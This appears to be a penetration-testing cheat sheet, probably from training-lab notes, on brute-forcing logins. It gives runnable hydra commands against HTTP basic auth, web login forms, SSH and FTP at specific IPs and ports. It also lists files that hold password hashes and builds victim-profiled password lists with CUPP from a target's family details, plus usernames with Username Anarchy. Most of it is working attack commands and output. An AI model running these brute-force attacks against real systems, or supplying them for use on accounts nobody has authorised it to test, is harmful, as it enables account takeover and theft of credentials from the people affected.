
Here is a small list of files that can contain hashed passwords:

|**`Windows`**|**`Linux`**|
|---|---|
|unattend.xml|shadow|
|sysprep.inf|shadow.bak|
|SAM|password|

There are many tools and methods to utilize for login brute-forcing, like:

- `Ncrack`
- `wfuzz`
- `medusa`
- `patator`
- `hydra`
- and others.

# Basic HTTP Auth Brute Forcing
## Hydra

```bash
hydra -C /usr/share/wordlists/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
```

>[!NOTE]
>Tip: We will add the "-u" flag, so that it tries all users on each password, instead of trying all 14 million passwords on one user, before moving on to the next.

```bash
hydra -L /usr/share/wordlists/seclists/Usernames/Names/names.txt -P /usr/share/wordlists/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
```

### Username Brute Force

```bash
hydra -L /usr/share/wordlists/seclists/Usernames/Names/names.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /
```

# Web Forms Brute Forcing

## Hydra

### Brute Forcing Forms
`Hydra` provides many different types of requests we can use to brute force different services. If we use `hydra -h`, we should be able to list supported services:

```bash
hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e
```

To find out how to use the `http-post-form` module, we can use the "`-U`" flag to list the parameters it requires and examples of usage:

```bash
hydra http-post-form -U
```

In summary, we need to provide three parameters, separated by `:`, as follows:

1. `URL path`, which holds the login form
2. `POST parameters` for username/password
3. `A failed/success login string`, which lets hydra recognize whether the login attempt was successful or not

```bash
"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'"
```

#### Fail/Success String

| **Type**  | **Boolean Value** | **Flag**         |
| --------- | ----------------- | ---------------- |
| `Fail`    | FALSE             | `F=html_content` |
| `Success` | TRUE              | `S=html_content` |

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -u -f 94.237.52.234 -s 46077 http-post-form "/login.php:username=^USER^&password=^PASS^:Login"
```


# Service Authentication Attacks

## Personalized Wordlists

### CUPP

CUPP is used to create a custom password list.

```bash
cupp -i

___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: William
> Surname: Gates
> Nickname: Bill
> Birthdate (DDMMYYYY): 28101955

> Partners) name: Melinda
> Partners) nickname: Ann
> Partners) birthdate (DDMMYYYY): 15081964

> Child's name: Jennifer
> Child's nickname: Jenn
> Child's birthdate (DDMMYYYY): 26041996

> Pet's name: Nila
> Company name: Microsoft

> Do you want to add some key words about the victim? Y/[N]: Phoebe,Rory
> Do you want to add special chars at the end of words? Y/[N]: y
> Do you want to add some random numbers at the end of words? Y/[N]:y
> Leet mode? (i.e. leet = 1337) Y/[N]: y

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to william.txt, counting 43368 words.
[+] Now load your pistolero with william.txt and shoot! Good luck!
```

### Password Policy

 ```bash
sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # remove no special chars
sed -ri '/[0-9]+/!d' william.txt            # remove no numbers
```

### Mangling

It is still possible to create many permutations of each word in that list. We never know how our target thinks when creating their password, and so our safest option is to add as many alterations and permutations as possible, noting that this will, of course, take much more time to brute force.

Many great tools do word mangling and case permutation quickly and easily, like [rsmangler](https://github.com/digininja/RSMangler) or [The Mentalist](https://github.com/sc0tfree/mentalist.git). These tools have many other options, which can make any small wordlist reach millions of lines long. We should keep these tools in mind because we might need them in other modules and situations.

### Custom Username Wordlist
One such tool we can use is [Username Anarchy](https://github.com/urbanadventurer/username-anarchy), which we can clone from GitHub, as follows:

```bash
git clone https://github.com/urbanadventurer/username-anarchy.git
./username-anarchy Bill Gates > bill.txt
```

## SSH Bruteforcing
As usual, we will add the `-u -f` flags. Finally, when we run the command for the first time, `hydra` will suggest that we add the `-t 4` flag for a max number of parallel attempts, as many `SSH` limit the number of parallel connections and drop other connections, resulting in many of our attempts being dropped
```bash
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
```

## FTP Bruteforcing

```bash
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
```